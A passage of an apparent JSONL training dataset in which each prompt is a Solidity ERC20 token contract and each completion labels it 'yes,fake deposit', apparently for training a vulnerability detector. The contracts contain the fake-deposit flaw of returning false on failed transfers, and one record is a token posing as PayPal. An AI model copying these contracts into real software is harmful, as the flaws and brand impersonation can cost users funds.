transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract AnalCoin is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.1.3';\n\n function AnalCoin(\n ) {\n balances[msg.sender] = 500000000000000000000000000;\n totalSupply = 500000000000000000000000000;\n name = \"CoinDev.io\";\n decimals = 18;\n symbol = \"ANAL\";\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n/// @return total amount of tokens\nfunction totalSupply() constant returns (uint256 supply) {}\n\n/// @param _owner The address from which the balance will be retrieved\n/// @return The balance\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\n\n/// @notice send `_value` token to `_to` from `msg.sender`\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\n\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approvedby `_from`\n/// @param _from The address of the sender\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n/// @param _spender The address of the account able to transfer the tokens\n\n/// @param _value The amount of wei to be approved for transfer\n/// @return Whether the approval was successful or not\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\n\n/// @param _owner The address of the account owning tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @return Amount of remaining tokens allowed to spent\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n//Default assumes totalSupply can&#39;t be over max (2^256 - 1).\n//If your token leaves out totalSupply and can issue more tokens as time goes on,\n//you need to check if it doesn&#39;t wrap.\n//Replace the if with this one instead.\n//if (balances[msg.sender] &gt;= _value &amp;&amp; balances[_to] + _value &gt; balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n}\n\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n//same as above. Replace this line with the following if you want to protect againstwrapping uints.\n//if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n}\n\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n}\n\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n}\n\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n}\n\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\nuint256 public totalSupply;\n\n \n}\n\n//name this contract whatever you&#39;d like\ncontract AghettoCoin is StandardToken {\n\nfunction () { //if ether is sent to this address, send it back.\nthrow;\n}\n\n\n\n\nstring public name; //fancy name: eg Simon Bucks\nuint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It&#39;s like comparing 1 wei to 1 ether.\nstring public symbol; //An identifier: eg SBX\nstring public version = '1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you&#39;re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\nfunction ERC20Token() {\n balances[msg.sender] = 100000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000; // Update total supply (100000 forexample)\n name = \"AghettoCoin\"; // Set the name for display purposes\n\n decimals = 5; // Amount of decimals for display purposes\n symbol = \"AGTC\"; // Set the symbol for display purposes\n}\n\n\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. Thiscrafts the function signature manually so one doesn&#39;t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes_extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n \n \n}\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 20000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000; // Update total supply (100000 for example)\n name = \"Miko Coin\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"MIKOCOIN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n\n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract STToken is UnboundedRegularToken {\n\n uint public totalSupply = 33*10**25;\n uint8 constant public decimals = 18;\n string constant public name = \"StarToken\";\n string constant public symbol = \"ST\";\n\n function STSToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ShibaHotDog is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Shiba Hot Dog\";\n string public constant symbol = \"INU \ud83c\udf2d\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// PayPal Official Token\n// https://paypal.com\n// https://twitter.com/PayPal\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract PayPal is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"PayPal\";\n string public constant symbol = \"PAYPAL\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'GrilledCheeseToken' token contract\n//\n// Symbol : GCT \ud83e\udd6a\n// Name : Grilled Cheese Token\n// Total supply: 100,000,000,000,000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract GrilledCheeseToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Grilled Cheese Token\";\n string public constant symbol = \"GCT \ud83e\udd6a\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.0;\n\nabstract contract Token {\n\n /// @return supply - total amount of tokens\n function totalSupply() external virtual returns (uint256 supply);\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return balance - The balance\n function balanceOf(address _owner) virtual public returns (uint256 balance);\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success - Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) virtual public returns (bool success);\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success - Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) virtual public returns (bool success);\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return success - Whether the approval was successful or not\n function approve(address _spender, uint256 _value) virtual public returns (bool success);\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return remaining - Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) virtual public returns (uint256 remaining);\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\nabstract contract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) override public returns (bool success) {\n require(paused == false, \"Contract Paused\");\n \n // Assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) override public returns (bool success) {\n require(paused == false, \"Contract Paused\");\n \n // Assumes totalSupply can't be over max (2^256 - 1).\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) override public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) override public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) override public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n function setPaused(bool _paused) public {\n require(msg.sender == owner, \"You are not the owner\");\n paused = _paused;\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public override totalSupply;\n bool public paused;\n address public owner;\n}\n\n\ncontract SMILECoin is StandardToken {\n \n \n mapping (address => uint256) public amount;\n string public name;\n string public symbol;\n uint256 public decimals;\n string public version;\n\n // if ETH is sent to this address, send it back.\n fallback() external payable { revert(); }\n receive() external payable { revert(); }\n \n constructor () {\n // Tokennomics\n name = \"Smile Coin\";\n decimals = 10;\n symbol = \"SMILE\";\n version = \"1.0\";\n \n owner = msg.sender;\n setPaused(false);\n \n // Mint 10,000,000,000 Tokens and assign them to the Smile Reserve Wallet\n totalSupply = 10000000000 * (10 ** uint256(decimals));\n balances[msg.sender] = totalSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract MoonDoge is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'MOGE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function MoonDoge() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Moon Doge\";\n decimals = 18; \n symbol = \"MOGE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Inu_Finance is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Inu Finance\";\n string public constant symbol = \"INUFI\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity ^0.4.20;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n \n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\n\ncontract StandardToken is Token {\n\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n\n if (balances[msg.sender] >= _value && _value > 0) {\n\n balances[msg.sender] -= _value;\n\n balances[_to] += _value;\n\n Transfer(msg.sender, _to, _value);\n\n return true;\n\n } else { return false; }\n\n }\n\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n\n //if 